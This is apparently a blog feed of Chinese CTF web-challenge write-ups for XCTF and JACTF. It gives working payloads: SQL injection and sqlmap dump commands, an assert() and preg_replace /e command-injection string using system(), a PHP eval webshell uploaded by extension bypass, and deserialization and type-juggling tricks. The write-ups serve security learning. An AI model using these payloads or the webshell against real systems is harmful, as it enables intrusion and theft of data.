&lt;h2 id=&quot;一、蓝鲸文件管理系统&quot;&gt;&lt;a href=&quot;#一、蓝鲸文件管理系统&quot; class=&quot;headerlink&quot; title=&quot;一、蓝鲸文件管理系统&quot;&gt;&lt;/a&gt;一、蓝鲸文件管理系统&lt;/h2&gt;&lt;p&gt;源代码地址：&lt;a href=&quot;htt
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="whale CTF" scheme="http://yoursite.com/tags/whale-CTF/"/>
    
  </entry>
  
  <entry>
    <title>XCTF Web新手</title>
    <link href="http://yoursite.com/2019/06/01/XCTF-Web%E6%96%B0%E6%89%8B/"/>
    <id>http://yoursite.com/2019/06/01/XCTF-Web新手/</id>
    <published>2019-05-31T18:37:38.580Z</published>
    <updated>2019-05-31T18:32:40.526Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="view-source"><a href="#view-source" class="headerlink" title="view source"></a>view source</h3><p>禁用右键，F12审查元素</p><h3 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h3><p>hackbar进行post</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_1.PNG" alt></p><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>直接访问robots.txt，发现f1ag_1s_h3re.ph文件，直接访问</p><h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>备份文件一般是在后缀名后加.swp，.bak</p><p>本题尝试index.php.bak成功获取源码</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>burp抓包，发现提示，查看cookie.php，在响应头发现flag</p><p>火狐，F12，网络，cookie可以看到提示，访问之后再看响应头即可</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_2.PNG" alt></p><h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>F12审查元素，找到按钮对应的代码，发现<strong>disabled=””</strong>，具体属性可以查看w3school，删除这个属性即可。</p><h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>拿到js源码，根据分析可以知道，函数dechiffre(pass_enc)的返回值与传入参数无关</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_3.PNG" alt></p><p>根据<code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code>，替换\x为%，再URLdecode一下，得到<code>55,56,54,79,115,69,114,116,107,49,50</code>，Firefox控制台运行一下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_4.PNG" alt></p><h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>burp改包</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_5.PNG" alt></p><h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可。但是这里我直接尝试admin，123456就登陆了，弱密码。</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>直接使用蚁剑</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_6.PNG" alt></p><h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>关于命令执行，windows或linux下: </p><p>command1 &amp;&amp; command2 先执行command1后执行command2</p><p>command1 | command2 只执行command2 </p><p>command1 &amp; command2 先执行command2后执行command1</p><p>本题先使用ls不断遍历目录，查找flag，最后再读取</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_7.PNG" alt></p><h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>看到源码，考察php弱类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>== 比较<br><strong>var_dump(‘a’ == 0)  //true</strong><br>a会被转化为数字0<br><strong>var_dump(‘1234a’ == 1234)  //true</strong><br>这里’1234a’会被转化为1234</p><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。</p><p>在$a==$b的比较中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">' '</span>;$b=<span class="keyword">null</span>        <span class="comment">//true</span></span><br><span class="line">$a=<span class="keyword">null</span>;$b=<span class="keyword">true</span>      <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>;$b=<span class="string">'0'</span>       <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>;$b=<span class="string">'abcdef '</span>  <span class="comment">//true  而0===’abcdef '  false</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>F12常开着</li><li>burp常开着</li><li>试试访问robots.txt</li><li>备份文件一般是在后缀名后加.swp，.bak</li><li>蚁剑是有两个部分的，一个是启动程序，一个是源码</li><li>php的弱类型</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;view-source&quot;&gt;&lt;a href=&quot;#view-source&quot; class=&quot;headerlink&quot; title=&quot;view source&quot;&gt;&lt;/a&gt;view source&lt;/h3&gt;&lt;p&gt;禁用右键，F12审查元素&lt;/p&gt;
&lt;h3 
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="XCTF" scheme="http://yoursite.com/tags/XCTF/"/>
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>XCTF-Web进阶(一)</title>
    <link href="http://yoursite.com/2019/06/01/XCTF-Web%E8%BF%9B%E9%98%B6(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/06/01/XCTF-Web进阶(一)/</id>
    <published>2019-05-31T18:37:38.578Z</published>
    <updated>2019-06-18T03:54:49.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>纯脑洞题，注意题目描述，<strong>报表中心</strong></p><p>进入主页后，选择报表中心，发现URL有个id参数，爆破到id=2333即可</p><h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><p>一个搜索框，尝试注入</p><p>输入 ‘ 返回空白页面，输入 ‘ # 返回正常，确定为字符注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos; order by 3 # //确认select字段为3</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,3 # //确认1，2，3的位置</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select schema_name from INFORMATION_SCHEMA.schemata limit 0,1) # //输出第一个库,INFORMATION_SCHEMA</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select schema_name from INFORMATION_SCHEMA.schemata limit 1,1) #  //输出第二个库,news,这里试出来总共就2个库</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select table_name from information_schema.tables where table_schema=&apos;news&apos; limit 1,1) # //这里试出来secret_table表</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select column_name from information_schema.columns where table_name=&apos;secret_table&apos; limit 0,1) #  //这里试出来fl4g字段</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select fl4g from secret_table) #  //直接查询</span><br></pre></td></tr></table></figure><h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h1><p>打开About页面，发现提示，git，尝试git泄露，githack下载源码，放到Seay中</p><p>目录结构</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_1.PNG" alt></p><p>可能存在的漏洞</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_2.PNG" alt></p><p>在index.php页面发现危险函数<strong>assert()</strong>，eval与assert都算是元老级一句话后门函数</p><p>eval函数中参数是字符，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">'echo 1;'</span>);</span><br></pre></td></tr></table></figure><p>assert函数中参数为表达式 （或者为函数），如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(phpinfo());</span><br><span class="line">assert(<span class="keyword">eval</span>(<span class="string">'echo 1;'</span>));</span><br></pre></td></tr></table></figure><p>index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个assert检测传入参数，防止LFI，第二个assert检查文件是否存在</p><p>可以在assert中构造代码执行，即<strong>system(‘cat templates/flag.php’)</strong>，直接闭合strpos函数即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"about.php', '..') === false and system('cat templates/flag.php') and strpos('templates/flag"</span>;  <span class="comment">//第三步</span></span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/about.php', '..') === false and system('cat templates/flag.php') and strpos('templates/flag.php"</span>;  <span class="comment">//第二步</span></span><br><span class="line"></span><br><span class="line">assert(<span class="string">"strpos('templates/about.php','..') === false and system('cat templates/flag.php') and strpos('templates/flag.php', '..') === false"</span>);  <span class="comment">//第一步</span></span><br></pre></td></tr></table></figure><h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>下载附件，是一段js代码，后缀名改成html</p><p>最后的eval是执行函数，将eval改为console.log，向控制台输出一条消息</p><p>即可查看代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line"><span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line"><span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line"><span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p>要求：</p><p>1、字符串长度16</p><p>2、以be0f23开头</p><p>3、以e98aa结尾</p><p>4、有233ac和c7be9</p><p>很容易拼接得到结果：be0f233ac7be98aa</p><h1 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h1><p>访问index.phps，获取源码片段，别问怎么知道的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");   exit(); &#125;  $_GET[id] = urldecode($_GET[id]); if($_GET[id] == "</span>admin<span class="string">") &#123;   echo "</span></span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line"></span><br><span class="line"><span class="string">";   echo "</span></span><br><span class="line"></span><br><span class="line">Key: xxxxxxx </span><br><span class="line"></span><br><span class="line"><span class="string">"; &#125; ?&gt;</span></span><br></pre></td></tr></table></figure><p>get一个参数id，id进行urldecode之后为admin，admin的url编码是%61%64%6D%69%6E，再进行一次url编码，为%2561%2564%256D%2569%256E，在index.php中提交。</p><h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>在主页获取到部分代码，盲猜反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__wakeup()这个函数是在对象创建的时候执行的，也就是说在创建一个xctf对象时，就立刻退出了</p><p>绕过方法：使类的属性数量大于原来的就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> xctf();</span><br><span class="line">$a = serialize($a);</span><br><span class="line">print_r($a);</span><br><span class="line"><span class="comment">//$a = O:4:"xctf":1:&#123;s:4:"flag";s:3:"111";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将序列化结果改为 <strong>O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</strong> 即可</p><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>文件上传，js前端验证后缀名，基于本地验证文件是否符合要求。直接将js禁用。或者burp抓包后修改后缀，将php文件后缀先改为jpg，burp抓包后改回php。</p><p>新建文件1.php，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>改名为1.jpg，然后上传，burp修改后缀，蚁剑连接。</p><h1 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h1><h1 id="Triangle"><a href="#Triangle" class="headerlink" title="Triangle"></a>Triangle</h1><h1 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h1><p>在URL栏fuzz URL得到如下结果：</p><p>1、正常URL，返回ping结果</p><p>2、非法URL(特殊符号)，返回Invalid URL</p><p>3、%80，返回Django报错</p><p>将报错信息保存为html，打开即为django报错页面</p><p>发现数据库路径</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_1.png" alt></p><p>pyload：@/opt/api/database.sqlite3</p><p>保存为html文件，发现flag</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_2.png" alt></p><p>总结：</p><p>当  <strong>CURLOPT_SAFE_UPLOAD</strong> 为 true 时，PHP 可以通过在参数中注入 <strong>@</strong> 来读取文件。</p><p>当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。  </p><h1 id="wtf-sh-150"><a href="#wtf-sh-150" class="headerlink" title="wtf.sh-150"></a>wtf.sh-150</h1><h1 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h1><p>根据提示，可利用的页面有三个，分别为 login.php，register.php，findpwd.php</p><p>发现 findpwd.php 存在注入</p><p>sqlmap 一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span></span><br><span class="line"></span><br><span class="line"> python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span> --tables</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span> -D cetc004 -T user --dump</span><br></pre></td></tr></table></figure><p>得到用户信息</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_ics4_1.png" alt></p><p>这里又一个逻辑漏洞，可以覆盖已注册的用户，重新注册一下用户即可</p><h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>index.php?page=index</p><p>观察URL，明显是个文件包含</p><p>index.php?page=php://filter/convert.base64-encode/resource=index.php</p><p>读取index.php，关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>X-Forwarded-For:127.0.0.1<br>/index.php?pat=/test/e&amp;rep=system(‘ls’);&amp;sub=test</p><p>/index.php?pat=/test/e&amp;rep=system(‘ls+-a+./s3chahahaDir’);&amp;sub=test</p><p>/index.php?<br>pat=/test/e&amp;rep=system(‘cat+./s3chahahaDir/flag/flag.php’);&amp;sub=test</p><p>遍历出目录，直接读取flag</p><p>总结：</p><p>preg_replace的 /e 模式会导致命令执行</p><h1 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h1><h1 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h1><h1 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h1><h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1><h1 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h1><h1 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h1><p>打开robots.txt，发现是个.git源码泄露，githack下载源码，很明显，buy是最关键的部分</p><p>数据是通过json传输的，buy的数据格式就是{“action”:”buy”,”numbers”:”1234567”}</p><p>关键函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($req)</span></span>&#123;</span><br><span class="line">require_registered();</span><br><span class="line">require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$money = $_SESSION[<span class="string">'money'</span>];</span><br><span class="line">$numbers = $req[<span class="string">'numbers'</span>];</span><br><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">$same_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line"><span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">$same_count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在一个弱类型比较，$numbers[$i] == $win_numbers[$i]，直接让传输的numbers全为true，即构造<strong>{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}</strong>，刷金币购买flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ics-06&quot;&gt;&lt;a href=&quot;#ics-06&quot; class=&quot;headerlink&quot; title=&quot;ics-06&quot;&gt;&lt;/a&gt;ics-06&lt;/h1&gt;&lt;p&gt;纯脑洞题，注意题目描述，&lt;strong&gt;报表中心&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;进入主页后，选择报表中心，
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="XCTF" scheme="http://yoursite.com/tags/XCTF/"/>
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>JACTF Web部分</title>
    <link href="http://yoursite.com/2019/06/01/JACTF-Web%E9%83%A8%E5%88%86/"/>
    <id>http://yoursite.com/2019/06/01/JACTF-Web部分/</id>
    <published>2019-05-31T18:37:38.577Z</published>
    <updated>2019-05-31T18:29:52.043Z</updated>
    
    <content type="html"><![CDATA[<p>平台已不运营</p><h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webqiandao_1.PNG" alt="Web签到"></p><p>发现请求URL为flag.php，但是会跳转到404.php页面，抓包发现有302重定向，查看响应包，flag经过base64编码，解码即可</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webqiandao_2.PNG" alt></p><blockquote><p>Tips：</p><p>重定向分为301和302两种</p><p>301为永久性</p><p>302为暂时性</p></blockquote><h2 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webxiazai_1.PNG" alt></p><p>直接请求<strong>?file=flag.php</strong>，获取源码，直接使用解密函数即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>); <span class="comment">//网页编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data, $key)</span> </span>&#123;</span><br><span class="line">$key = md5 ( $key );</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$len = strlen ( $data );</span><br><span class="line">$l = strlen ( $key );</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; 